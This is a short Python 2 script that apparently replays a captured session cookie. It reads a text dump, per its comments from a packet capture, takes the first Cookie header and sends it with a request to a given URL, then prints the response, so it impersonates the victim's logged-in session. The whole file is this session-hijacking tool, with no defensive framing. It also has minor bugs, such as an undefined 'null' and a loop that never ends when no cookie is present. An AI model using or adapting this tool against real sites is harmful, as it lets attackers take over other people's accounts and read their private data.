#!/usr/bin/python
import sys
import urllib2
import re
import requests
import cookielib

def main():
	# Optional - grab from pcap file. Automate to parse via multiple pcap files
	# Given cookie to url - pairing/matching
	for arg in sys.argv[1:3]:
		if ".txt" in sys.argv[1]:
			text = sys.argv[1]
		if "http://" in sys.argv[2]:
			req_url = sys.argv[2]
	print build_html(parse_pcap(text), req_url)

def parse_pcap(text):
	f = open(text)
	while True:
		reader = f.readline()
		if 'Cookie' in reader:
			reader = reader.replace("Cookie:", "")
			cookie = reader.replace('\r\n', '')
			return cookie
			break
	return null

def build_html(cookie, url):
	opener = urllib2.build_opener()
	opener.addheaders.append(('Cookie', cookie))
	response = opener.open(url)
	html = response.read()
	print response.info().headers
	return html

if __name__ == "__main__":
	main()